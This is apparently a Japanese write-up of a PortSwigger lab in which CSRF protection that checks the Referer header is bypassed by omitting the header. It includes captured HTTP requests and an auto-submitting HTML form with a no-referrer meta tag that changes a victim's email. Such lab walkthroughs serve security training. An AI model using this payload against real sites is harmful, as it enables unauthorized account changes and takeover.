# リファラー検証が存在するヘッダーに依存する CSRF

次のハッキングラボを実施します  
https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present  
このラボの電子メール変更機能は CSRF に対して脆弱です。クロスドメインリクエストをブロックしようとしますが、フォールバックは安全ではありません。

- 1. BurpSuite を起動して Procy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. 一般ユーザーでログインします
- 4. メールアドレスの更新を行います
- 5. POST /my-account/change-email リクエストのリファラーヘッダーのドメインを変更して送信すると失敗します

```
POST /my-account/change-email HTTP/2
Host: 0a6e002503a5788281df259100c3008e.web-security-academy.net
Cookie: session=0wLyV40i0IB8F3uypuudcnBZFhvY4791
・・・
Referer: https://0a6e002503a5788281df259100c3008e.web-security-academy.net2/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

email=test%40com
```

- 6. POST /my-account/change-email リクエストのリファラーヘッダーを削って送信すると成功します

```
POST /my-account/change-email HTTP/2
Host: 0a6e002503a5788281df259100c3008e.web-security-academy.net
Cookie: session=0wLyV40i0IB8F3uypuudcnBZFhvY4791
・・・

Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

email=test%40com
```

- 7. エクスプロイトサーバーに移動してボディに次のように入力します

```html
<html>
<head>
 <meta name="referrer" content="no-referrer">
<\head>
<body>
  <form method="POST" action="https://0a6e002503a5788281df259100c3008e.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="test2@com" />
    <input type="submit" value="submit" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```

- 8. Store ボタン押下、deliver exploit to victim ボタン押下で攻撃成功
